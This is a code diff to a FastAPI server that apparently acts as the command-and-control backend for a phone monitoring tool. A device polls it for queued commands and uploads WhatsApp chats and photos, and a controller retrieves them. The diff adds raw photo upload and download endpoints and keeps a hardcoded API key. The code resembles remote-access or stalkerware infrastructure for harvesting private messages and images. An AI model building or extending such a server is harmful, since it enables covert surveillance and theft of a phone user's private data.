@@ -1,4 +1,4 @@
-from fastapi import FastAPI, Request, HTTPException
+from fastapi import FastAPI, Request, HTTPException, UploadFile, File
 import time
 
 app = FastAPI()
@@ -6,7 +6,7 @@ API_KEY = "MY_SECRET_KEY_123"
 
 device_data = {} 
 command_queue = []
-latest_image_b64 = "" 
+latest_image_bytes = None # Changed to store raw bytes
 latest_wa_chats = []  
 debug_msg = "No debug info yet"
 
@@ -19,8 +19,6 @@ async def get_commands(request: Request):
     check_key(request)
     data = await request.json()
     device_id = data.get("device_id")
-    
-    # Save the exact time the Moto checked in
     data["last_seen"] = time.time()
     device_data[device_id] = data
     
@@ -28,18 +26,22 @@ async def get_commands(request: Request):
     command_queue.clear()
     return {"commands": cmds}
 
+# NEW: Accept raw file uploads
+@app.post("/upload_photo")
+async def upload_photo(request: Request, file: UploadFile = File(...)):
+    global latest_image_bytes
+    check_key(request)
+    latest_image_bytes = await file.read()
+    print(f"PHOTO SAVED! Size: {len(latest_image_bytes)} bytes")
+    return {"status": "ok"}
+
 @app.post("/result")
 async def post_result(request: Request):
-    global latest_image_b64, debug_msg
+    global debug_msg
     check_key(request)
     data = await request.json()
-    
     if "debug_text" in data:
         debug_msg = data["debug_text"]
-        
-    if "image_b64" in data:
-        latest_image_b64 = data["image_b64"]
-        
     return {"status": "ok"}
 
 @app.post("/wa")
@@ -56,8 +58,6 @@ async def post_wa(request: Request):
 @app.get("/state")
 async def get_state(request: Request):
     check_key(request)
-    
-    # Check if the device has checked in within the last 15 seconds
     now = time.time()
     active_devices = {}
     for dev_id, info in device_data.items():
@@ -66,10 +66,19 @@ async def get_state(request: Request):
 
     return {
         "devices": active_devices,
-        "latest_image_b64": latest_image_b64,
+        "has_image": latest_image_bytes is not None, # Tell controller if photo exists
         "wa_chats": latest_wa_chats,
         "debug_msg": debug_msg
     }
+
+# NEW: Serve the image bytes to the controller
+@app.get("/get_photo")
+async def get_photo(request: Request):
+    check_key(request)
+    if latest_image_bytes is None:
+        raise HTTPException(status_code=404, detail="No image")
+    from fastapi.responses import Response
+    return Response(content=latest_image_bytes, media_type="image/jpeg")
 
 @app.post("/queue_cmd")
 async def queue_command(request: Request):
